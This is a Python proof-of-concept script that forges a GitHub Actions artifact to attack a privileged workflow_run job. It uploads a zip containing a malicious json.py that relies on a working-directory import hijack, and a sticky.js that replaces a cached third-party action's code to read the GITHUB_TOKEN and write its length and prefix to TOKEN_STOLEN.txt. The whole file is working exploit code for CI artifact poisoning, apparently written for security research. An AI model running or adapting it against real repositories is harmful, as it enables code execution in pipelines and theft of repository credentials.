#!/usr/bin/env python3
"""Minimal client for the Actions results (artifacts) twirp service."""
import base64, hashlib, json, os, subprocess, sys, time, zipfile
from urllib.parse import urlparse

TOKEN = os.environ['ACTIONS_RUNTIME_TOKEN']
_u = urlparse(os.environ['ACTIONS_RESULTS_URL'])
ORIGIN = f'{_u.scheme}://{_u.netloc}'
SVC = f'{ORIGIN}/twirp/github.actions.results.api.v1.ArtifactService'

def ids():
    t = TOKEN.split('.')[1]
    t += '=' * (-len(t) % 4)
    c = json.loads(base64.urlsafe_b64decode(t))
    for s in c['scp'].split(' '):
        p = s.split(':')
        if p[0] == 'Actions.Results':
            return p[1], p[2]
    raise SystemExit('no Actions.Results scope')

WR, JR = ids()

def rpc(method, body):
    import urllib.request
    req = urllib.request.Request(
        f'{SVC}/{method}', data=json.dumps(body).encode(),
        headers={'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json'},
        method='POST')
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        try:
            b = e.read().decode()
        except Exception:
            b = ''
        return {'__error': str(e), '__body': b[:300]}

def list_artifacts():
    return rpc('ListArtifacts', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR})

def create(name):
    body = {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
            'name': name, 'mime_type': 'application/zip', 'version': 7}
    return rpc('CreateArtifact', body)

def upload(url, path):
    r = subprocess.run(['curl', '-sS', '-o', '/dev/null', '-w', '%{http_code}', '-X', 'PUT', url,
                        '-H', 'x-ms-blob-type: BlockBlob', '-H', 'Content-Type: application/zip',
                        '--data-binary', '@' + path], capture_output=True, text=True)
    return r.stdout.strip()

def finalize(name, path):
    data = open(path, 'rb').read()
    h = hashlib.sha256(data).hexdigest()
    return rpc('FinalizeArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
                                    'name': name, 'size': str(len(data)), 'hash': 'sha256:' + h})

def mkzip(path, entries):
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
        for n, d in entries:
            z.writestr(n, d)
    return path

PAYLOAD_JSON_PY = """import os, shutil
ws = os.environ.get('GITHUB_WORKSPACE', '.')
try:
    open(os.path.join(ws, 'RCE_PROOF.txt'), 'w').write('RCE: python CWD import hijack in privileged workflow_run job\\n')
    envf = os.environ.get('GITHUB_ENV')
    if envf:
        open(envf, 'a').write('RCE_IMPORT_PROOF=yes\\n')
    act = os.path.join(ws, '..', '..', '_actions', 'marocchino', 'sticky-pull-request-comment', 'v3', 'dist', 'index.js')
    shutil.copyfile(os.path.join(ws, 'sticky.js'), act)
    print('RCE-PAYLOAD-EXECUTED')
except Exception as e:
    print('payload-error', e)
"""

STICKY_JS = """try {
  const fs = require('fs');
  const t = process.env['INPUT_GITHUB_TOKEN'] || process.env.GITHUB_TOKEN || '';
  fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/TOKEN_STOLEN.txt',
    'token_len=' + String(t).length + ' prefix=' + String(t).slice(0, 7) + '\\n');
  console.log('HIJACKED-ACTION-RAN token_len=' + String(t).length);
} catch (e) { console.log('sticky-error', e) }
"""

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'probe'
    print('WR', WR, 'JR', JR, 'ORIGIN', ORIGIN)
    if mode == 'forge':
        name = sys.argv[2] if len(sys.argv) > 2 else 'pr-coverage-report'
        entries = [
            ('bull-report/target/site/jacoco-aggregate/jacoco.xml',
             '<report><counter type="LINE" missed="1" covered="99"/></report>'),
            ('pr_number.txt', '1\n'),
            ('json.py', PAYLOAD_JSON_PY),
            ('sticky.js', STICKY_JS),
        ]
        path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'forge.zip')
        mkzip(path, entries)
        cr = create(name)
        print('FORGE-CREATE', json.dumps(cr)[:160])
        if cr.get('ok'):
            print('FORGE-UPLOAD', upload(cr['signed_upload_url'], path))
            print('FORGE-FINALIZE', json.dumps(finalize(name, path))[:200])
        print('FORGE-LIST', json.dumps(list_artifacts())[:600])
    else:
        print('LIST', json.dumps(list_artifacts())[:600])

main()
